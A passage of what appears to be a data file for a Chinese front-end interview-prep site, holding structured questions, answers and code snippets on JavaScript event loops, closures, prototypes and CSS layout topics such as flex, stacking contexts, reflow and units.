// 2: async 同步部分
// 7: 同步
// 3: 微任务
// 4: await 后（微任务）
// 5: rAF（渲染前）
// 6: 宏任务（渲染后）
// 解析：同步先执行（1,2,7），微任务清空（3,4），
// rAF 在渲染前（5），setTimeout 是下一轮宏任务（6）`,
                difficulty: 'hard',
                tags: ['事件循环', 'async', 'await', 'rAF', '面试必考'],
                keyPoints: ['同步→微任务→rAF→渲染→宏任务', 'await 后续是微任务', 'rAF 在渲染前', 'setTimeout 是宏任务'],
              },
            ],
          },
        },
        {
          id: 'iv-p1-3',
          type: 'demo',
          visualizationType: 'concept-explain-viz',
          data: {
            templates: [
              {
                id: 'closure-explain',
                title: '闭包',
                conclusion: '闭包是函数与其词法作用域的组合，使内部函数可以访问外部函数的变量。',
                analysis: 'JavaScript 采用词法作用域（静态作用域），函数的作用域在定义时确定而非调用时。当内部函数被返回到外部执行时，它仍然持有对外部函数变量作用域链的引用，这个引用就是闭包。闭包使得函数结束后其变量不会被 GC 回收（因为仍有引用）。',
                examples: `function createCounter() {
  let count = 0;  // 外部变量
  return () => ++count;  // 闭包
}
const counter = createCounter();
counter(); counter(); // count = 2`,
                extension: '闭包 vs 对象：闭包通过函数封装状态，对象通过属性封装状态。闭包实现真正的私有（外部无法访问 count），对象需用 # 私有字段或约定。模块模式（IIFE + 闭包）是 ES6 前的主要模块化方案。',
              },
              {
                id: 'event-loop-explain',
                title: '事件循环',
                conclusion: '事件循环是 JS 单线程下的异步调度机制：同步代码→微任务→宏任务循环执行。',
                analysis: 'JS 引擎有一个调用栈和一个事件循环。同步代码在调用栈执行；异步操作完成后回调放入任务队列。每次调用栈清空后，先执行所有微任务，再取一个宏任务执行，如此循环。微任务包括 Promise.then、MutationObserver；宏任务包括 setTimeout、I/O。',
                examples: `console.log('1');
setTimeout(() => console.log('2'), 0);  // 宏任务
Promise.resolve().then(() => console.log('3'));  // 微任务
console.log('4');
// 输出：1 → 4 → 3 → 2`,
                extension: 'Node.js 的事件循环与浏览器不同：Node 有 6 个阶段（timers/pending/callbacks/idle/poll/check/close），process.nextTick 优先于微任务。了解差异有助于编写跨平台代码。',
              },
              {
                id: 'prototype-explain',
                title: '原型链',
                conclusion: '每个对象通过 __proto__ 链接到其构造函数的 prototype，形成原型链，属性查找沿链向上。',
                analysis: 'JavaScript 没有传统的类继承，而是基于原型。访问对象属性时，先在对象自身查找，找不到则沿 __proto__ 向上查找，直到 Object.prototype.__proto__（null）。这条链就是原型链。构造函数的 prototype 属性指向原型对象，原型对象的 constructor 指回构造函数。',
                examples: `function Person(name) { this.name = name; }
Person.prototype.greet = function() { console.log(this.name); };
const p = new Person('Alice');
// p → Person.prototype → Object.prototype → null
p.greet(); // 'Alice'（从原型链找到）`,
                extension: 'ES6 class 是原型链继承的语法糖。class 中的方法定义在 prototype 上，static 方法定义在构造函数上。理解原型链是理解 React 组件、Vue 组件、自定义事件等的基础。',
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 2：CSS 八股汇总
    // ========================================================================
    {
      order: 2,
      title: 'CSS 八股汇总',
      difficulty: 2,
      visualizationType: 'concept-explain-viz',
      blocks: [
        {
          id: 'iv-p2-1',
          type: 'paragraph',
          lead: true,
          text: 'CSS 面试八股覆盖 BFC、居中方案、Flex/Grid、重绘回流等核心考点。以下通过概念阐释可视化展示答题结构。',
        },
        {
          id: 'iv-p2-2',
          type: 'demo',
          visualizationType: 'concept-explain-viz',
          data: {
            templates: [
              {
                id: 'bfc-explain',
                title: 'BFC（块级格式化上下文）',
                conclusion: 'BFC 是一个独立的渲染区域，内部元素的布局不影响外部元素。',
                analysis: 'BFC（Block Formatting Context）是 CSS 视觉渲染的一部分，用于决定块级盒的布局及浮动相互影响。BFC 内部的元素按特定规则排列，且与外部隔离。触发 BFC 的条件：float 非 none、position 为 absolute/fixed、display 为 flex/grid/inline-block/table-cell、overflow 非 visible。',
                examples: `/* 清除浮动：父元素触发 BFC */
.clearfix { overflow: hidden; }
/* 或 */
.clearfix::after { content: ''; display: block; clear: both; }

/* 避免 margin 重叠 */
.bfc { overflow: hidden; } /* 父元素触发 BFC */`,
                extension: 'BFC 应用场景：1) 清除浮动；2) 避免 margin 重叠；3) 实现两栏自适应布局（左浮动+右 BFC）。与 IFC（行内格式化上下文）、GFC（网格）、FFC（弹性）对应不同 display 值。',
              },
              {
                id: 'centering-explain',
                title: 'CSS 居中方案',
                conclusion: '居中方案取决于场景：Flex（最通用）、Grid（最简洁）、absolute+transform（定位元素）、absolute+margin auto（已知尺寸）。',
                analysis: 'CSS 居中分水平居中、垂直居中、两者兼有。现代方案首选 Flex（display:flex; justify-content:center; align-items:center）或 Grid（display:grid; place-items:center）。传统方案用 absolute 定位 + transform: translate(-50%,-50%)（不需知道尺寸）或 margin: auto（需知道尺寸）。',
                examples: `/* Flex 居中（推荐） */
.parent { display: flex; justify-content: center; align-items: center; }

/* Grid 居中（最简洁） */
.parent { display: grid; place-items: center; }

/* absolute + transform */
.child { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }`,
                extension: '行内元素居中用 text-align:center（水平）和 line-height/vertical-align（垂直）。表格单元格用 vertical-align: middle。Flex 对行内元素同样有效。',
              },
            ],
          },
        },
        {
          id: 'iv-p2-3',
          type: 'demo',
          visualizationType: 'comparetable',
          data: {
            featureColumn: '题目',
            columns: ['核心答案', '难度'],
            highlightColumn: 0,
            rows: [
              { feature: 'BFC 触发条件', values: ['float≠none / position=absolute,fixed / display=flex,grid,inline-block / overflow≠visible', '中'] },
              { feature: 'Flex vs Grid', values: ['Flex 一维布局（行或列），Grid 二维布局（行和列）', '易'] },
              { feature: 'em vs rem', values: ['em 相对父元素字体大小，rem 相对根元素（html）字体大小', '易'] },
              { feature: '伪类 vs 伪元素', values: ['伪类选择特定状态（:hover），伪元素创建新内容（::before）', '易'] },
              { feature: '重绘 vs 回流', values: ['重绘仅改变外观不改布局，回流改变布局（尺寸/位置），回流必触发重绘', '中'] },
              { feature: '层叠上下文', values: ['z-index 在同一层叠上下文中比较；position+z-index/opacity<1/transform 创建新层叠上下文', '难'] },
              { feature: 'CSS3 新特性', values: ['过渡transition、变换transform、动画animation、弹性盒flex、网格grid、自定义属性', '易'] },
            ],
          },
        },
        {
          id: 'iv-p2-4',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'css',
            mode: 'sequential',
            questions: [
              {
                id: 'css-flex-grow',
                domain: 'css',
                question: 'Flex 布局中 flex: 1 的完整含义？flex-grow/shrink/basis 分别什么作用？',
                shortAnswer: 'flex: 1 = flex: 1 1 0%。flex-grow 分配剩余空间，flex-shrink 收缩溢出空间，flex-basis 初始尺寸。flex:1 表示等分剩余空间且可收缩。',
                detailedAnswer: 'flex 是 flex-grow / flex-shrink / flex-basis 的简写：\n\nflex-grow（默认 0）：分配容器剩余空间的比例\n- 0：不增长，保持 basis 尺寸\n- 1：按比例分配剩余空间\n- 多个 item grow 不同时，按比例分配\n\nflex-shrink（默认 1）：空间不足时收缩的比例\n- 0：不收缩\n- 1：按比例收缩\n\nflex-basis（默认 auto）：初始主轴尺寸\n- auto：以内容/width 为准\n- 具体值：如 200px、50%\n- 0%：不考虑内容，完全靠 grow 分配\n\nflex 简写常见值：\n- flex: 0 1 auto（默认 initial）\n- flex: 1 1 0%（即 flex: 1，等分）\n- flex: 0 0 auto（即 flex: none，不伸缩）\n- flex: 1 1 auto（即 flex: auto，按内容+剩余）\n\n常见场景：\n- 三栏布局（左固定+中 flex:1+右固定）\n- 等宽分栏（每个 flex:1）\n- 防止挤压（侧栏 flex: 0 0 200px）\n\n坑：flex: 1 在内容超出时仍会收缩（shrink:1），想完全固定用 flex: 0 0 200px。',
                difficulty: 'medium',
                tags: ['Flex', '布局', '面试必考'],
                keyPoints: ['flex: 1 = grow 1 / shrink 1 / basis 0%', 'grow 分配剩余空间', 'shrink 收缩溢出', 'basis 初始尺寸'],
              },
              {
                id: 'css-grid-vs-flex',
                domain: 'css',
                question: 'Grid 和 Flex 的本质区别？何时用 Grid 何时用 Flex？',
                shortAnswer: 'Flex 一维布局（行或列），适合组件内对齐；Grid 二维布局（行列同时），适合整体页面布局。Flex 内容优先，Grid 布局优先。',
                detailedAnswer: '本质区别：\n\nFlex（一维）：\n- 单一方向布局（flex-direction: row/column）\n- 内容驱动：从内容出发布局\n- 适合：导航栏、按钮组、卡片内对齐、工具栏\n- 优势：对齐能力强（justify/align）、自适应\n\nGrid（二维）：\n- 同时控制行列\n- 布局驱动：先定义网格再放内容\n- 适合：整体页面布局、仪表板、复杂卡片网格\n- 优势：grid-template-areas 直观描述布局\n\n对比示例：\n页面布局用 Grid：\n.grid { display: grid; grid-template-areas: "header header" "sidebar main" "footer footer"; grid-template-columns: 200px 1fr; }\n\n导航栏用 Flex：\n.nav { display: flex; justify-content: space-between; align-items: center; }\n\n选择原则：\n- 整体页面骨架 → Grid\n- 组件内部对齐 → Flex\n- 一行/一列内容 → Flex\n- 行列网格 → Grid\n- 不确定时：Grid 更强大但 Flex 更简单\n\n现代实践：Grid 做外层布局，Flex 做内层对齐，二者配合。',
                difficulty: 'medium',
                tags: ['Grid', 'Flex', '布局'],
                keyPoints: ['Flex 一维内容驱动', 'Grid 二维布局驱动', 'Grid 适合页面骨架', 'Flex 适合组件对齐'],
              },
              {
                id: 'css-selector-priority',
                domain: 'css',
                question: 'CSS 选择器优先级如何计算？!important 何时用？',
                shortAnswer: '优先级：内联(1000) > ID(100) > 类/属性/伪类(10) > 元素/伪元素(1)。!important 强制最高，但应避免滥用，维护困难。',
                detailedAnswer: 'CSS 选择器优先级计算（ specificity ）：\n\n四位数字（a, b, c, d）：\n- a：内联样式（style=""），1000\n- b：ID 选择器（#id），100\n- c：类/属性/伪类（.class、[attr]、:hover），10\n- d：元素/伪元素（div、::before），1\n- 通配符 *、组合符（>+~）不计算\n\n示例：\n#nav .item → 100 + 10 = 110\nul li.item → 1 + 1 + 10 = 12\ndiv → 1\n\n比较规则：\n- 从左到右逐位比较（不是相加后比较）\n- 1,0,0,0 > 0,99,99,99（内联 > 任意选择器）\n- 相同优先级，后写的覆盖\n\n!important：\n- 优先级最高（覆盖内联）\n- 多个 !important 仍按 specificity 比较\n- 缺点：维护噩梦，后续覆盖只能用 !important\n- 仅在第三方库覆盖等无奈场景用\n\n继承：\n- color、font、line-height 等会继承\n- box-sizing、border、margin 不会继承\n- inherit 关键字强制继承\n\n最佳实践：\n- 用 class 为主，少用 ID（优先级过高难覆盖）\n- BEM 命名（block__element--modifier）降低优先级冲突\n- 避免内联样式和 !important',
                difficulty: 'medium',
                tags: ['选择器', '优先级', '面试必考'],
                keyPoints: ['四位数字 a,b,c,d', '内联 1000 > ID 100 > 类 10 > 元素 1', '从左到右逐位比较', '避免 !important'],
              },
              {
                id: 'css-responsive',
                domain: 'css',
                question: '响应式设计如何实现？rem/em/vw/vh 的区别？',
                shortAnswer: '响应式：媒体查询 + 弹性布局 + 相对单位。rem 相对根字号，em 相对父字号，vw/vh 相对视口 1%。移动优先用 rem + 根字号适配。',
                detailedAnswer: '响应式设计核心：\n\n1. 媒体查询（@media）：\n@media (max-width: 768px) { ... }\n@media (min-width: 769px) and (max-width: 1024px) { ... }\n- 移动优先：默认移动样式，min-width 增强桌面\n- 桌面优先：默认桌面，max-width 降级移动\n\n2. 弹性布局：Flex/Grid 自适应\n\n3. 相对单位：\n- rem：相对根元素（html）字号，1rem = 根 font-size\n- em：相对父元素字号（嵌套会累积）\n- vw/vh：视口宽度/高度的 1%\n- vmin/vmax：min/max(vw, vh)\n- %：相对父元素\n- ch：字符宽度\n\n4. 响应式图片：\n- srcset + sizes：<img srcset="a.jpg 1x, a@2x.jpg 2x">\n- picture 元素：<picture><source media=... srcset=...>\n- max-width: 100%（图片不超出容器）\n\n5. 移动适配方案：\n方案 A：rem + JS 设根字号（淘宝 flexible.js）\ndocument.documentElement.style.fontSize = window.innerWidth / 10 + px\n方案 B：vw（推荐，无需 JS）\n1vw = 屏幕宽 1%，按设计稿 750px 算：1px = 100/750 vw\n方案 C：clamp()（现代）\nfont-size: clamp(14px, 4vw, 18px)（最小 14，最大 18，中间随视口）\n\n6. viewport meta：\n<meta name=viewport content="width=device-width, initial-scale=1">\n\nem vs rem 选择：\n- 字号、间距用 rem（统一缩放）\n- 组件内相对用 em（如 padding 相对自身字号）',
                difficulty: 'hard',
                tags: ['响应式', 'rem', 'vw'],
                keyPoints: ['媒体查询 + 弹性布局 + 相对单位', 'rem 相对根 em 相对父', 'vw/vh 相对视口', 'clamp 现代方案'],
              },
              {
                id: 'css-animation-perf',
                domain: 'css',
                question: 'CSS 动画性能优化？为何 transform 比 top/left 快？',
                shortAnswer: 'transform/opacity 只触发合成（GPU），不触发布局重绘；top/left 触发回流重绘。动画优先用 transform，避免改几何属性。',
                detailedAnswer: 'CSS 动画性能优化原理：\n\n渲染管线：HTML→DOM→CSSOM→Render Tree→Layout→Paint→Composite\n\n触发阶段决定性能：\n1. 改几何属性（width/margin/top/left）→ 触发 Layout（回流）+ Paint + Composite，最慢\n2. 改外观属性（color/background）→ 触发 Paint + Composite，中等\n3. 改 transform/opacity → 只触发 Composite（GPU 加速），最快\n\n为何 transform 快：\n- transform 在合成阶段处理，由 GPU 完成\n- 不影响其他元素布局（不触发 Layout）\n- 不触发 Paint（直接在 GPU 层操作）\n- 浏览器为 transform 元素创建独立图层\n\n性能优化方案：\n1. 动画属性选择：\n   - 移动用 transform: translate（不用 top/left）\n   - 缩放用 transform: scale（不用 width/height）\n   - 旋转用 transform: rotate\n   - 透明度用 opacity（不用 visibility）\n\n2. will-change 提示浏览器：\n   .anim { will-change: transform, opacity; }\n   - 提前创建图层，但不要滥用（占内存）\n\n3. 避免强制同步布局：\n   - 不要在读布局属性后立即写布局属性\n   - 错：el.style.width = 100px; const w = el.offsetWidth;\n\n4. 使用 requestAnimationFrame：\n   - 与浏览器刷新率同步（通常 60fps）\n   - 比 setTimeout 更精准\n\n5. contain: layout（CSS Containment）：\n   - 隔离子树布局影响\n   - contain: layout style paint\n\n6. 动画硬件加速：\n   - transform: translateZ(0) 触发 GPU 层\n   - 但过多图层会占内存\n\n性能指标：60fps（每帧 16.6ms），掉帧即卡顿。',
                difficulty: 'hard',
                tags: ['动画', '性能优化', 'transform'],
                keyPoints: ['transform/opacity 只触发合成', 'top/left 触发回流重绘', 'will-change 提示浏览器', 'requestAnimationFrame 同步刷新'],
              },
              {
                id: 'css-box-model',
                domain: 'css',
                question: 'CSS 盒模型有哪几种？box-sizing 的作用是什么？',
                shortAnswer: '盒模型分标准盒模型（content-box，width 只含 content）和 IE 盒模型（border-box，width 含 content+padding+border）。box-sizing 切换两种模型，推荐用 border-box。',
                detailedAnswer: 'CSS 盒模型由外到内：margin → border → padding → content。\n\n两种盒模型：\n1. 标准盒模型（content-box，默认）：\n   - width/height 只包含 content\n   - 实际占地宽 = width + padding + border + margin\n   - 加 padding 会让元素变宽，需手动计算\n2. IE 盒模型（border-box）：\n   - width/height 包含 content + padding + border\n   - 实际占地宽 = width + margin\n   - 加 padding 不改变元素总宽（content 自动缩小）\n\nbox-sizing 作用：切换两种模型。\n- content-box：标准模型（默认）\n- border-box：IE 模型\n\n推荐实践：全局设置 border-box，避免 padding 撑大布局。\n* { box-sizing: border-box; }\n\n注意：\n- margin 不算入 width（无论哪种模型）\n- box-sizing 不影响 margin 折叠\n- 现代框架（Bootstrap/Tailwind）默认 border-box',
                codeExample: `/* 全局 border-box（推荐） */
* { box-sizing: border-box; }

/* 对比 */
.box-a { width: 200px; padding: 20px; } /* content-box 实际 240px */
.box-b { width: 200px; padding: 20px; box-sizing: border-box; } /* 实际 200px */`,
                difficulty: 'easy',
                tags: ['盒模型', 'box-sizing', '面试必考'],
                keyPoints: ['content-box 仅 content', 'border-box 含 padding+border', 'box-sizing 切换模型', '推荐 border-box'],
              },
              {
                id: 'css-position',
                domain: 'css',
                question: 'CSS position 各值的区别？relative/absolute/fixed/sticky 的定位参照物分别是什么？',
                shortAnswer: 'static 默认不定位；relative 相对自身原位置；absolute 相对最近的非 static 祖先；fixed 相对视口；sticky 滚动到阈值前 relative、达到阈值后 fixed。z-index 仅对非 static 生效。',
                detailedAnswer: 'position 五种取值：\n1. static（默认）：不定位，按文档流排列，top/right/bottom/left/z-index 无效\n2. relative：相对自身原位置偏移，原位置保留（不脱离文档流），常作为 absolute 的定位上下文\n3. absolute：脱离文档流，相对最近的非 static 祖先元素定位，无则相对 initial containing block（约等于视口）\n4. fixed：脱离文档流，相对视口定位（滚动不动）；但若有 transform/filter/perspective 的祖先会成为包含块\n5. sticky：相对滚动容器，未达阈值时按文档流（relative 行为），达到阈值后变为 fixed 行为，超出父容器范围后失效\n\n定位参照物：\n- relative：自身原位置\n- absolute：最近的 position≠static 的祖先\n- fixed：视口（或 transform 祖先）\n- sticky：滚动容器 + 父容器边界\n\nz-index：仅对 position≠static 的元素生效，且需在同一层叠上下文中比较。\n\n常见应用：\n- relative + absolute：父相子绝（ tooltip、角标、装饰元素）\n- fixed：固定头部、悬浮按钮、遮罩\n- sticky：吸顶导航、表头',
                codeExample: `/* 父相子绝 */
.parent { position: relative; }
.badge { position: absolute; top: -8px; right: -8px; }

/* 吸顶导航 */
.nav { position: sticky; top: 0; z-index: 100; }

/* fixed 注意 transform 陷阱 */
.transform-parent { transform: translateZ(0); }
.fixed-child { position: fixed; } /* 不再相对视口，相对 transform-parent */`,
                difficulty: 'medium',
                tags: ['position', '定位', '面试必考'],
                keyPoints: ['relative 相对自身保留位置', 'absolute 相对非 static 祖先', 'fixed 相对视口', 'sticky 滚动阈值切换'],
              },
              {
                id: 'css-clear-float',
                domain: 'css',
                question: '为什么要清除浮动？有哪些清除浮动的方法？',
                shortAnswer: '父元素高度塌陷（子元素浮动后脱离文档流，父高度为 0）。清除方法：BFC（overflow:hidden）、clearfix（::after 伪元素+clear）、display:flow-root。推荐 flow-root 或 clearfix。',
                detailedAnswer: '清除浮动的原因：\n子元素设置 float 后脱离文档流，父元素无法被撑开，导致父高度塌陷，影响后续布局。\n\n清除浮动方法：\n1. 父元素触发 BFC：\n   - overflow: hidden（副作用：溢出内容被裁剪）\n   - overflow: auto（副作用：可能出滚动条）\n   - display: flow-root（现代方案，无副作用，专门为 BFC 设计）\n\n2. clearfix 伪元素（最通用）：\n   .clearfix::after { content: ""; display: block; clear: both; }\n   或更完整的版本：\n   .clearfix::after { content: ""; display: table; clear: both; }\n\n3. 额外标签法（不推荐）：在末尾加 <div style="clear:both"></div>\n4. 父元素也浮动（不推荐，转移问题）\n5. br 标签 clear 属性（已废弃）\n\n推荐方案：\n- 新项目用 display: flow-root（语义清晰，无副作用）\n- 兼容老浏览器用 clearfix 伪元素\n\n注意：浮动原本设计目的是文字环绕图片，布局只是"借用"。现代布局优先 Flex/Grid，浮动布局已少用。',
                codeExample: `/* 方案 1：flow-root（推荐） */
.parent { display: flow-root; }

/* 方案 2：clearfix（兼容性好） */
.clearfix::after {
  content: "";
  display: table;   /* 或 block */
  clear: both;
}
.clearfix { *zoom: 1; } /* IE6/7 hack */

/* 使用 */
<div class="parent clearfix">
  <div style="float:left">左</div>
  <div style="float:right">右</div>
</div>`,
                difficulty: 'easy',
                tags: ['清除浮动', 'BFC', 'clearfix'],
                keyPoints: ['浮动导致父高度塌陷', 'BFC 清除浮动', 'clearfix 伪元素', 'flow-root 现代方案'],
              },
              {
                id: 'css-flex-centering',
                domain: 'css',
                question: '用 Flex 实现垂直居中有几种方式？justify-content 和 align-items 的区别？',
                shortAnswer: '主轴居中用 justify-content: center；交叉轴居中用 align-items: center；两者都 center 即完全居中。还可单元素用 margin: auto。justify 管主轴，align 管交叉轴。',
                detailedAnswer: 'Flex 居中方案：\n\n1. 父元素设 flex + justify + align（最常用）：\n   .parent { display: flex; justify-content: center; align-items: center; }\n   - justify-content: center 主轴居中\n   - align-items: center 交叉轴居中\n\n2. 父元素 flex + 子元素 margin: auto：\n   .parent { display: flex; }\n   .child { margin: auto; }\n   - flex 下 margin:auto 会吸收所有可用空间\n\n3. 父元素 flex + 子元素 align-self：\n   .parent { display: flex; justify-content: center; }\n   .child { align-self: center; }\n\njustify-content vs align-items：\n- justify-content 控制主轴（main axis）方向的对齐\n  - flex-direction: row 时主轴水平\n  - flex-direction: column 时主轴垂直\n- align-items 控制交叉轴（cross axis）方向的对齐\n  - row 时交叉轴垂直\n  - column 时交叉轴水平\n\n注意主轴方向随 flex-direction 变化：\n- row（默认）：水平主轴，justify 控水平，align 控垂直\n- column：垂直主轴，justify 控垂直，align 控水平\n\n其他对齐值：\n- justify-content: flex-start/flex-end/center/space-between/space-around/space-evenly\n- align-items: stretch（默认）/flex-start/flex-end/center/baseline',
                codeExample: `/* 方案 1：父元素 flex（推荐） */
.parent {
  display: flex;
  justify-content: center; /* 主轴居中 */
  align-items: center;     /* 交叉轴居中 */
}

/* 方案 2：子元素 margin auto */
.parent { display: flex; }
.child { margin: auto; }

/* 方案 3：Grid 一行搞定 */
.parent { display: grid; place-items: center; }`,
                difficulty: 'easy',
                tags: ['Flex', '居中', 'justify-content', 'align-items'],
                keyPoints: ['justify 主轴 align 交叉轴', '主轴随 direction 变化', 'margin auto 吸收空间', 'Grid place-items 更简洁'],
              },
              {
                id: 'css-stacking-context',
                domain: 'css',
                question: '什么是层叠上下文（Stacking Context）？z-index 失效通常是什么原因？',
                shortAnswer: '层叠上下文是 CSS 渲染的"图层"。z-index 只在同一层叠上下文内比较。创建新层叠上下文（position+z-index/opacity<1/transform 等）后，子元素的 z-index 不会越过父层级。z-index 失效多因父元素创建了新层叠上下文。',
                detailedAnswer: '层叠上下文（Stacking Context）：CSS 渲染中的一个"图层"概念，元素在 3D 空间沿 Z 轴的渲染顺序由层叠上下文决定。\n\n层叠顺序（同一上下文内，从底到顶）：\n1. 根层叠上下文的 background/border\n2. 负 z-index 的定位元素\n3. block 级元素（普通流）\n4. float 元素\n5. inline 元素\n6. z-index: auto / 0 的定位元素\n7. 正 z-index 的定位元素\n\n创建新层叠上下文的条件：\n1. 根元素 html（根层叠上下文）\n2. position: absolute/relative 且 z-index ≠ auto\n3. position: fixed（始终创建）\n4. opacity < 1\n5. transform ≠ none\n6. filter ≠ none / backdrop-filter ≠ none\n7. mix-blend-mode ≠ normal\n8. will-change: transform 等\n9. isolation: isolate\n10. contain: layout/paint/strict/content\n\nz-index 失效原因：\n1. 父元素创建了新层叠上下文，子元素的 z-index 只在父层级内比较，无法越过\n2. 元素 position 为 static（z-index 无效）\n3. 不同层叠上下文间的 z-index 不直接比较\n\n经典问题：弹窗 z-index: 9999 仍被遮挡，因为弹窗祖先有 transform/opacity 创建了新上下文，整体层级被限制。\n\n解决：\n- 把弹窗挂到 body 下（脱离原父级）\n- 移除祖先的 transform/opacity（如可能）\n- 用 Portal（React）teleport（Vue）',
                codeExample: `/* z-index 失效示例 */
.parent { transform: scale(1); } /* 创建新层叠上下文 */
.child { position: fixed; z-index: 9999; } /* 仍受 parent 限制 */
.sibling { position: relative; z-index: 2; } /* 可能盖过 child */

/* 解决：移到 body */
<body>
  <div class="parent"><div class="child"></div></div>
  <div class="portal-modal"></div> <!-- 挂到 body 顶层 -->
</body>`,
                difficulty: 'hard',
                tags: ['层叠上下文', 'z-index', '面试必考'],
                keyPoints: ['z-index 同上下文内比较', 'transform/opacity 创建新上下文', '子层级不能越过父层级', '弹窗挂 body 解决'],
              },
              {
                id: 'css-repaint-reflow',
                domain: 'css',
                question: '重绘（Repaint）和回流（Reflow）的区别？如何避免？',
                shortAnswer: '回流改变几何属性（尺寸/位置），必触发重绘；重绘只改外观（颜色/背景），不触发回流。回流代价远高于重绘。避免：用 transform 代替 top/left、批量改样式、避免频繁读布局属性、用 will-change。',
                detailedAnswer: '重绘（Repaint）vs 回流（Reflow）：\n\n回流（Reflow/Layout）：元素的几何属性（位置、尺寸）变化，浏览器需重新计算布局。\n触发：\n- 改 width/height/margin/padding/top/left 等\n- 增删 DOM、改 textContent\n- 窗口 resize\n- 计算 offsetWidth/scrollTop 等（强制同步布局）\n\n重绘（Repaint）：元素外观属性变化但几何不变，浏览器重新绘制像素。\n触发：color、background、border-color、box-shadow、visibility 等。\n\n关系：回流必触发重绘，重绘不一定回流。回流的性能代价远高于重绘。\n\n避免策略：\n1. 用 transform 代替 top/left（transform 不触发回流）\n2. 用 opacity 代替 visibility（opacity 不触发重绘）\n3. 批量修改样式：用 class 切换或 cssText，避免多次 style.xxx =\n4. 批量 DOM 操作：DocumentFragment 或 display:none 后操作\n5. 避免强制同步布局：不要在写布局后立即读布局属性\n   - 错：el.style.width = "100px"; const w = el.offsetWidth;\n   - 对：先读后写\n6. 用 will-change 提示浏览器\n7. 用 contain: layout 隔离子树\n8. 动画用 position: absolute/fixed（脱离文档流，不影响其他元素）\n9. 防抖 resize/scroll 事件\n\n现代浏览器优化：\n- 队列化样式修改，批量执行\n- 但读布局属性会强制刷新队列（强制同步布局）',
                codeExample: `// 错：读写交替触发强制同步布局
for (let i = 0; i < els.length; i++) {
  els[i].style.width = els[i].offsetWidth + 10 + "px";
}

// 对：先读后写
const widths = els.map(el => el.offsetWidth);
els.forEach((el, i) => el.style.width = widths[i] + 10 + "px");

// 用 transform 代替 top/left
// 错：box.style.left = x + "px";
box.style.transform = "translateX(" + x + "px)"; // 不触发回流`,
                difficulty: 'medium',
                tags: ['重绘', '回流', '性能优化', '面试必考'],
                keyPoints: ['回流改几何必触发重绘', '重绘改外观不触发回流', '避免强制同步布局', 'transform 代替 top/left'],
              },
              {
                id: 'css-pseudo-class-element',
                domain: 'css',
                question: '伪类和伪元素的区别？::before 和 :before 有什么不同？',
                shortAnswer: '伪类选择特定状态的元素（:hover/:first-child），不创建新元素；伪元素创建虚拟的新元素（::before/::after）。::before 是 CSS3 语法（双冒号），:before 是 CSS2 旧语法，效果相同但推荐双冒号。',
                detailedAnswer: '伪类（Pseudo-class）vs 伪元素（Pseudo-element）：\n\n伪类：选择处于特定状态的已有元素，单冒号语法。\n- 状态类：:hover、:active、:focus、:visited、:link\n- 结构类：:first-child、:last-child、:nth-child(n)、:nth-of-type(n)、:only-child\n- 表单类：:checked、:disabled、:enabled、:valid、:invalid\n- 否定类：:not()\n- 目标类：:target\n\n伪元素：创建文档树中不存在的新虚拟元素，双冒号语法（CSS3）。\n- ::before / ::after：在元素内容前/后插入内容（必须配合 content 属性）\n- ::first-line / ::first-letter：选首行/首字母\n- ::selection：选中文本样式\n- ::placeholder：占位符样式\n\n::before vs :before：\n- CSS2 用单冒号 :before\n- CSS3 为区分伪类和伪元素，伪元素改双冒号 ::before\n- 现代浏览器两种写法都支持（伪元素）\n- 推荐用双冒号（语义清晰）\n\n关键区别：\n1. 伪类选已有元素的状态，伪元素创建新虚拟元素\n2. 伪元素必须配 content（即使空 content:""）\n3. 伪元素默认是 inline，可改 display\n4. 伪元素一个选择器只能出现一个，且必须在末尾\n\n应用：\n- 清除浮动（::after）\n- 图标（::before + 字体图标）\n- 装饰元素（::before/::after + position）\n- 内容生成（content: attr(data-text)）',
                codeExample: `/* 伪类：选状态 */
a:hover { color: red; }
li:first-child { font-weight: bold; }
li:nth-child(2n) { background: #f5f5f5; } /* 偶数行 */
input:not(:disabled) { cursor: pointer; }

/* 伪元素：创建新元素 */
.clearfix::after {
  content: "";
  display: block;
  clear: both;
}
.icon::before {
  content: "\\f00c"; /* Unicode 图标 */
  font-family: "FontAwesome";
}
.tooltip::after {
  content: attr(data-tip); /* 从属性取内容 */
  position: absolute;
}`,
                difficulty: 'easy',
                tags: ['伪类', '伪元素', '::before'],
                keyPoints: ['伪类选状态单冒号', '伪元素创建新元素双冒号', '伪元素需 content', '::before 是 CSS3 语法'],
              },
              {
                id: 'css-units',
                domain: 'css',
                question: 'px/em/rem/vw/vh/% 等单位的区别？什么场景用哪个？',
                shortAnswer: 'px 绝对单位；em 相对父字号（嵌套累积）；rem 相对根字号；vw/vh 相对视口 1%；% 相对父元素。字号用 rem，间距用 em/rem，响应式用 vw/vh，布局用 %。',
                detailedAnswer: 'CSS 单位分类：\n\n1. 绝对单位：\n   - px：像素，最直观但不适配\n   - pt/cm/mm/in：物理单位，少用\n\n2. 相对单位（字体相关）：\n   - em：相对父元素 font-size，嵌套会累积\n     - 用在组件内相对尺寸（padding/margin 相对自身字号）\n     - 嵌套陷阱：父 1.2em × 子 1.2em = 1.44em\n   - rem：相对根元素 html 的 font-size\n     - 整站统一缩放，推荐用于字号\n     - 配合根字号 JS 适配\n   - ch：字符 "0" 的宽度（等宽字体常用）\n   - ex：字符 "x" 的高度\n\n3. 相对单位（视口相关）：\n   - vw：视口宽度的 1%\n   - vh：视口高度的 1%\n   - vmin：min(vw, vh)，小屏友好\n   - vmax：max(vw, vh)\n   - 适合全屏布局、响应式字号\n\n4. 相对单位（父元素相关）：\n   - %：相对父元素（width 相对父 width，padding/margin 相对父 width 即使是垂直方向）\n   - 适合流式布局、弹性宽度\n\n场景推荐：\n- 字号：rem（统一缩放）\n- 组件内间距：em（相对自身字号，组件复用）\n- 全屏布局：vw/vh\n- 容器宽度：% 或 fr（Grid）\n- 边框：px\n- 响应式字号：clamp(min, vw, max)\n\n移动端适配：\n- 方案 1：rem + JS 设根字号（如 flexible.js）\n- 方案 2：vw（无需 JS，1vw = 屏宽 1%）\n- 方案 3：clamp(min, preferred, max) 限制范围',
                codeExample: `/* 字号用 rem */
html { font-size: 16px; } /* 默认 */
h1 { font-size: 2rem; }   /* 32px */

/* 组件内用 em */
.btn { font-size: 1rem; padding: 0.5em 1em; } /* padding 相对自身字号 */

/* 响应式用 vw */
.title { font-size: clamp(1.5rem, 4vw, 2.5rem); }

/* 全屏用 vh */
